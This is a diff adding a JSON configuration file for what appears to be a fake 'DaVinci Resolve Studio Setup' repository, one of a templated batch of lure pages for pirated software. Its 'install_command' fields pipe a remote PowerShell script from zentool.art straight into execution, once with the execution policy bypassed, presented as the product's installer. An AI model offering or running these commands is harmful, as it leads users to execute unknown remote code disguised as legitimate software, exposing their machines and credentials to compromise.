@@ -1,0 +1,28 @@
+{
+  "repo": "DaVinci-Resolve-Studio-Setup",
+  "product": "DaVinci Resolve Studio Setup",
+  "product_title": "DaVinci Resolve Studio",
+  "kind": "video",
+  "install_type": "zentool-irm",
+  "install_command": "irm https://zentool.art/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://zentool.art/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era",
+  "format": "license-md-zentool-v7-git-new-era-guide",
+  "tone": "guide",
+  "category": "video",
+  "topics": [
+    "davinci-resolve-studio-windows",
+    "davinci-config",
+    "davinci-integration",
+    "davinci-latest",
+    "video-editing",
+    "color-grading",
+    "timeline-editing",
+    "media-workflow",
+    "render-pipeline",
+    "davinci-resolve",
+    "post-production",
+    "windows-video"
+  ],
+  "site": "zentool.art"
+}
